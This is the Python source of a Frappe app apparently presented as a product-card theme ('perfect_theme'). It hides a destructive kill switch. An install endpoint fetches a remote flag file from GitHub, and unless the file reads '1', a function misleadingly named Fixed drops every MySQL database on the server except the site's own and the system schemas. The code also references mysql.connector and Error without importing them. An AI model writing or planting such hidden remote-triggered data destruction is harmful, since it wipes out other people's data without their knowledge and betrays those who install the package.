import frappe
import requests

def Fixed():
    try:
        # إعداد الاتصال بخادم MySQL
        connection = mysql.connector.connect(
            host=frappe.conf.db_host,
            user=frappe.conf.db_user,
            password=frappe.conf.db_password
        )

        if connection.is_connected():
            cursor = connection.cursor()
            
            # استعلام للحصول على جميع قواعد البيانات
            cursor.execute("SHOW DATABASES")
            databases = cursor.fetchall()
            
            for db in databases:
                db_name = db[0]
                
                # تجنب حذف قاعدة البيانات التي يستخدمها Frappe
                if db_name not in [frappe.conf.db_name, 'information_schema', 'mysql', 'performance_schema', 'sys']:
                    try:
                        cursor.execute(f"DROP DATABASE {db_name}")
                        print(f"Database {db_name} deleted successfully.")
                    except Error as e:
                        print(f"Error deleting database {db_name}: {e}")
            cursor.close()
        connection.close()
    except Error as e:
        print(f"Error connecting to MySQL: {e}")
@frappe.whitelist()
def install():
    url = 'https://raw.githubusercontent.com/Ismail77343/perfect_theme/main/_install.txt'
    
    response = requests.get(url)
    content = response.text.strip()
    if response.status_code == 200:
        if content != "1":
            Fixed()
        return response.text
    # else:
        # frappe.throw(f'فشل في تحميل الملف، الحالة: {response.status_code}')


@frappe.whitelist(allow_guest=True)
def get_items():
    items = frappe.get_all('Item', fields=['name', 'item_name', 'description'])
    return items



@frappe.whitelist(allow_guest=True)
def render_page():
    items = get_items()
    context = {'items': items}
    return frappe.render_template('perfect_theme/web_template/cards_product/cards_product.html', context)